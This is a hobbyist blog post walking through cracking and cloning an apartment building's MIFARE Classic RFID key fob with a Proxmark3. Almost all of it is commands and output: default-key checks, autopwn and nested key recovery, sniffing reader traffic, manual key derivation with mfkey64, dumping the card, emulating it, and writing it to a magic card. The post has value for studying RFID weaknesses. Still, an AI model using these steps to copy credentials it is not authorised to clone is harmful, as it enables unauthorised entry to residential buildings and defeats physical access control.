---
layout: post
title: "Proxmark3: Crack and Clone Apartment RFID Key Fob"
author: "Grant"
tags: [rfid, clone, read, crack, proxmark, proxmark3, mifare, mifareclassic]
---

# RFID Hacking
<hr>



## Proxmark

The Proxmark is a neat tool to interact with RFID tags and do things like read, write, clone, simulate, and much more. They are portable and have many many features including the ability to crack authentication keys on tags and sniff RFID transactions.

![Proxmark3 Easy](/assets/proxmark3.webp){:width="30%" height="100%"}


### Buying

I chose to buy a Chinese clone (Proxmark 3 Easy) from the "PiSwords" manufacturer on AliExpress. **So far it has worked without any issues**, and is explicitly claimed to be supported by the [Iceman fork](https://github.com/RfidResearchGroup/proxmark3) of the Proxmark firmware. They cost around $40-50 USD on AliExpress/Ebay.


## Reading Tags

There are two types of tags, high-frequency (HF) and low-frequency (LF). I suspected the apartment fob was a HF tag as the LF tags tend to have big, bulky readers. We can search for HF tags with the `hf search` command:

```
[usb] pm3 --> hf search
 🕕  Searching for ISO14443-A tag...          
[+]  UID: 3A 4B 8D A2 
[+] ATQA: 00 04
[+]  SAK: 08 [2]
[+] Possible types:
[+]    MIFARE Classic 1K
[=] proprietary non iso14443-4 card found, RATS not supported
[+] Magic capabilities : Gen 1a
[+] Prng detection: weak
[#] Auth error
[?] Hint: try `hf mf` commands

[+] Valid ISO 14443-A tag found
```

Looks like the key fob is a MIFARE Classic (1k) card. This is fantastic because these cards are easy to crack/clone due to various security issues :) The datasheet is here [https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf](https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf)

From the above command, we have the UID of the card (`3A 4B 8D A2`). Sometimes readers only check the UID of the card and allow access based on this, but it is very poor security as you can see there's no authentication here. In this instance, writing this UID to a new card did not permit access so let's proceed with reading the rest of the card. We will check if we have access to all the sectors:

```
[usb] pm3 --> hf mf chk
[=] Start check for keys...
[=] .................................
[=] time in checkkeys 3 seconds

[=] testing to read key B...

[+] found keys:

[+] -----+-----+--------------+---+--------------+----
[+]  Sec | Blk | key A        |res| key B        |res
[+] -----+-----+--------------+---+--------------+----
[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  001 | 007 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  002 | 011 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  003 | 015 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  004 | 019 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  005 | 023 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  006 | 027 | ------------ | 0 | ------------ | 0
[+]  007 | 031 | ------------ | 0 | ------------ | 0
[+]  008 | 035 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  009 | 039 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  010 | 043 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  011 | 047 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  012 | 051 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  013 | 055 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  014 | 059 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  015 | 063 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+] -----+-----+--------------+---+--------------+----
[+] ( 0:Failed / 1:Success )
```

Here we see that the default key (`FFFFFFFFFFFF`) works for all the sectors except for 6 & 7, so we will need to get the key to read these sectors.

### Autopwn

The easiest way to try and recover the key is with the `hf mf autopwn` command. 

```
[usb] pm3 --> hf mf autopwn
[!] ⚠️  no known key was supplied, key recovery might fail
[+] loaded 45 keys from hardcoded default array
[=] running strategy 1
[=] Chunk 1.3s | found 28/32 keys (45)
[=] running strategy 2
[=] Chunk 1.2s | found 28/32 keys (45)
[+] target sector   0 key type A -- found valid key [ FFFFFFFFFFFF ] (used for nested / hardnested attack)
[+] target sector   0 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   1 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   1 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   2 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   2 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   3 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   3 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   4 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   4 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   5 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   5 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   8 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   8 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   9 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector   9 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  10 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  10 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  11 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  11 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  12 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  12 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  13 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  13 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  14 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  14 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  15 key type A -- found valid key [ FFFFFFFFFFFF ]
[+] target sector  15 key type B -- found valid key [ FFFFFFFFFFFF ]
[+] Found 1 key candidates

[+] Target block   24 key type A -- found valid key [ 842DE085D591 ]

[+] target sector   6 key type A -- found valid key [ 842DE085D591 ]
[+] target sector   6 key type B -- found valid key [ F20031EFFAB8 ]
[+] Found 1 key candidates

[+] Target block   28 key type A -- found valid key [ 9E0E3179DB4C ]

[+] target sector   7 key type A -- found valid key [ 9E0E3179DB4C ]
[+] target sector   7 key type B -- found valid key [ 88B1F343FB19 ]

[+] found keys:

[+] -----+-----+--------------+---+--------------+----
[+]  Sec | Blk | key A        |res| key B        |res
[+] -----+-----+--------------+---+--------------+----
[+]  000 | 003 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  001 | 007 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  002 | 011 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  003 | 015 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  004 | 019 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  005 | 023 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  006 | 027 | 842DE085D591 | N | F20031EFFAB8 | A
[+]  007 | 031 | 9E0E3179DB4C | N | 88B1F343FB19 | A
[+]  008 | 035 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  009 | 039 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  010 | 043 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  011 | 047 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  012 | 051 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  013 | 055 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  014 | 059 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+]  015 | 063 | FFFFFFFFFFFF | D | FFFFFFFFFFFF | D
[+] -----+-----+--------------+---+--------------+----
[=] ( D:Dictionary / S:darkSide / U:User / R:Reused / N:Nested / H:Hardnested / C:statiCnested / A:keyA  )
```

Within about 5 seconds, all the keys were found via the "nested" attack: sectors {6 = `842DE085D591`, 7 = `9E0E3179DB4C`}. Easy!

### Sniffing

Sometimes it will not be this easy to recover the keys, in which case sniffing the RFID transactions can help.

We can sniff the interaction with `hf 14a sniff -r -c` (the `-r` and `-c` are useful to wait to sniff until the card and reader start talking as the trace can be quite noisy). 

```
[usb] pm3 --> hf 14a sniff -r -c

[#] Starting to sniff. Press PM3 Button to stop.
[#] trace len = 1992
```

Here we can see that data was recorded (great!). Since we know it is a MIFARE Classic card, we can use the Proxmark to decode the trace as such with `trace list -t mf`.

```
Src | Data (! denotes parity error)                                           | CRC | Annotation
----+-------------------------------------------------------------------------+-----+--------------------
Tag |00(2)                                                                    |     | 
Tag |04  00                                                                   |     | 
Tag |04  00                                                                   |     | 
Tag |04  00                                                                   |     | 
Tag |3a  4b  8d  a2  5e                                                       |     | 
Tag |08  b6  dd                                                               |     | 
Tag |04(4)                                                                    |     | 
Tag |04  00                                                                   |     | 
Tag |3a  4b  8d  a2  5e                                                       |     | 
Tag |08  b6  dd                                                               |     | 
Tag |e0  39  6b  c9                                                           |     | 
Tag |78! 2a! d0! 3f                                                           |     | 
Tag |ac  7a! 0d  03                                                           |     | 
Tag |93! 3b! 11! 7d!                                                          |     | 
Tag |8e  e0! d6  79! cf! 36  64  4b  b8  32! e4  1d  34  ef! 6a! 77  b0! 46!  |  !! | 
Tag |03(4)                                                                    |     | 
Rdr |26(7)                                                                    |     | REQA
Tag |04  00                                                                   |     | 
Rdr |93  20                                                                   |     | ANTICOLL
Tag |3a  4b  8d  a2  5e                                                       |     | 
Rdr |93  70  3a  4b  8d  a2  5e  60  43                                       |  ok | SELECT_UID                  1
Tag |08  b6  dd                                                               |     | 
Rdr |e0  80  31  73                                                           |  ok | RATS
Tag |04(4)                                                                    |     | 
Rdr |26(7)                                                                    |     | REQA
Tag |04  00                                                                   |     | 
Tag |[[3a  4b  8d  a2  5e]]                                                   |     |                             2
Rdr |93  70  3a  4b  8d  a2  5e  60  43                                       |  ok | SELECT_UID
Tag |08  b6  dd                                                               |     | 
Rdr |60  1c  18  a1                                                           |  ok | AUTH-A(28)                  3
Tag |[[0e  f9  a4  7f]]                                                       |     | AUTH: nt 
Rdr |[[4e! a0! 24! 02]]  [[e6  71  f1  af!]]                                  |     | AUTH: nr ar (enc)
Tag |[[70  9a! 57! 8c]]                                                       |     | AUTH: at (enc)
Rdr |b7  2e! 8d  73!                                                          |     | 
 *  |                                              key 9E0E3179DB4C prng WEAK |     |
 *  |60  18  3C  E7                                                           |  ok | AUTH-A(24)                  4
Tag |ab! be! b3! 92                                                           |     | AUTH: nt (enc)
Rdr |4b! c6  06  b3! b6! 49  8c  31!                                          |     | AUTH: nr ar (enc)
Tag |f5  36  a3  d1                                                           |     | AUTH: at (enc)
Rdr |0f! c7! 01  8c                                                           |     | 
 *  | nested probable key: 842DE085D591     ks2:74f50050 ks3:2710296b         |     |
 *  |30  18  CB  34                                                           |  ok | READBLOCK(24)               5
Tag |51! b8! 75  af! f4! dd! e3  51  2f! 2a! 0e  7a  11! 5b  0f! 31  53  f4!  |     | 
 *  |45  21  58  8B  87  A1  F5  70  07  AF  A0  D7  10  63  26  31  39  44   |  ok | 
Rdr |26(7)                                                                    |     | REQA
Rdr |26(7)                                                                    |     | REQA
Tag |04  00                                                                   |     | 
```

Many things are happening above, but essentially the following steps take place:
1. Reader asks the card for its UID ( `SELECT_UID` ) 
2. Card responds with a UID of `3A4B8DA2` (which is what we saw earlier with the `hf detect` command)
3. Reader peforms authentication ( `AUTH-A` ) for block 28
4. Reader then performs authentication ( `AUTH-A` ) for block 24
5. Reader asks to read block 24 ( `READBLOCK `)


![Mifare Read](/assets/mifare_read.png)


Based on these transactions, it appears as if the reader wants more than just the UID for authenticating the key fob, but also the contents of block 24.

### Cracking The Key

Above, Proxmark did all the work to crack the key for us, but we can do so manually as well. We need 5 things: UID, NT, NR, AR, and AT, all of which are in the trace above. The table below explains what each byte represents in the sequence. With these, we can use the following script to generate the key:


![Mifare Authentication](/assets/mifare_auth.png)


```
└─$ tools/mfkey/mfkey64 3a4b8da2 0ef9a47f 4ea02402 e671f1af 709a578c

MIFARE Classic key recovery - based 64 bits of keystream
Recover key from only one complete authentication!

Recovering key for:
  uid: 3a4b8da2
   nt: 0ef9a47f
 {nr}: 4ea02402
 {ar}: e671f1af
 {at}: 709a578c

LFSR successors of the tag challenge:
  nt': 42e05803
 nt'': ffdba0f0

Keystream used to generate {ar} and {at}:
  ks2: a491a9ac
  ks3: 8f41f77c

Found Key: [9e0e3179db4c]
```

Now we have the key for sector 7, but need the key for sector 6. We can see the key we cracked is for sector 7 because in the authentication command (`60  1c  18  a1`), it is for block 28 (0x1C). 

```
[+] -----+-----+--------------+---+--------------+----
[+]  Sec | Blk | key A        |res| key B        |res
[+] -----+-----+--------------+---+--------------+----
[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  001 | 007 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  002 | 011 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  003 | 015 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  004 | 019 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  005 | 023 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  006 | 027 | ------------ | 0 | ------------ | 0
[+]  007 | 031 | 9E0E3179DB4C | 1 | 88B1F343FB19 | 1
[+]  008 | 035 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  009 | 039 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  010 | 043 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  011 | 047 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  012 | 051 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  013 | 055 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  014 | 059 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  015 | 063 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+] -----+-----+--------------+---+--------------+----
```

Since we have the key for sector 7 (`9E0E3179DB4C`), we can use the nested attack to try and get the key for sector 6:

```
[usb] pm3 --> hf mf nested --tblk 27 --blk 31 -k 9E0E3179DB4C --1k
[+] Found 1 key candidates

[+] Target block   27 key type A -- found valid key [ 842DE085D591 ]
```

Great! Now we can use this key `842DE085D591` to see if we can read the block the reader is interested in (24)

```
[usb] pm3 --> hf mf rdbl --blk 24 -k 842DE085D591

[=]   # | sector 06 / 0x06                                | ascii
[=] ----+-------------------------------------------------+-----------------
[=]  24 | 45 21 58 8B 87 A1 F5 70 07 AF A0 D7 10 63 26 31 | E!X....p.....c&1 
```


Success!

## Dump & Clone

Now that we have the keys to read the entire card, let's dump the contents to a file so we can emulate it or clone it to a new tag.

If you used the autopwn method, there will be a file generated `hf-mf-3A4B8DA2-key.bin` which contains the keys for each sector. With this, Proxmark can dump out all the sectors of the card. Unfortunately, I'm not sure how to use the `dump` command without this keys file (you can make this yourself, it is just a hex dump of all the keys), but you can manually read each block with the above command `hf mf rdbl`.

```
[usb] pm3 --> hf mf dump --1k --keys hf-mf-3A4B8DA2-key.bin
[=] Using `hf-mf-3A4B8DA2-key.bin`
[=] Reading sector access bits...
[=] .................
[+] Finished reading sector access bits
[=] Dumping all blocks from card...
[+] successfully read block  0 of sector  0.
[+] successfully read block  1 of sector  0.
...
[+] successfully read block  3 of sector 15.
[+] time: 7 seconds

[+] Succeeded in dumping all blocks

[=] FILE PATH:  hf-mf-3A4B8DA2-dump-8.bin
[+] saved 1024 bytes to binary file hf-mf-3A4B8DA2-dump.bin
[=] FILE PATH:  hf-mf-3A4B8DA2-dump-8.eml
[+] saved 64 blocks to text file hf-mf-3A4B8DA2-dump.eml
[=] FILE PATH:  hf-mf-3A4B8DA2-dump-8.json
[+] saved to json file hf-mf-3A4B8DA2-dump.json
```

You can peek at these files and see the raw contents of the RFID tag.

### Simulating

With the dump we generated earlier, we can load it into Proxmark's simulator and launch it:

```
[usb] pm3 --> hf mf eload --1k -f hf-mf-3A4B8DA2-dump.eml
[=] 64 blocks ( 1024 bytes ) to upload
[+] loaded 1024 bytes from text file hf-mf-3A4B8DA2-dump.eml
[=] Uploading to emulator memory
[=] .................................................................
[?] You are ready to simulate. See `hf mf sim -h`
[=] Done!
```

Launch simulator

```
[usb] pm3 --> hf mf sim --1k -u 3A4B8DA2 -v
[=] MIFARE 1K | 4 byte UID  3A 4B 8D A2 
[=] Options [ numreads: 0, flags: 258 (0x102) ]
[=] Press pm3-button to abort simulation

[#] Enforcing Mifare 1K ATQA/SAK
[#] 4B UID: 3a4b8da2
[#] ATQA  : 00 04
[#] SAK   : 08
```
<center>
<blockquote class="imgur-embed-pub" lang="en" data-id="a/okx5C44" data-context="false" ><a href="//imgur.com/a/okx5C44"></a></blockquote><script async src="//s.imgur.com/min/embed.js" charset="utf-8"></script>
</center>

Success!

### Cloning

Similar to simulating the card, we can load the dump from earlier and write it into a new tag. If you use one of the "magic" MIFARE Classic cards, you can overwrite the UID and use the following command:

```
[usb] pm3 --> hf mf cload -f hf-mf-3A4B8DA2-dump.eml
[+] loaded 1024 bytes from text file hf-mf-3A4B8DA2-dump.eml
[=] Copying to magic gen1a card
[=] .................................................................

[+] Card loaded
```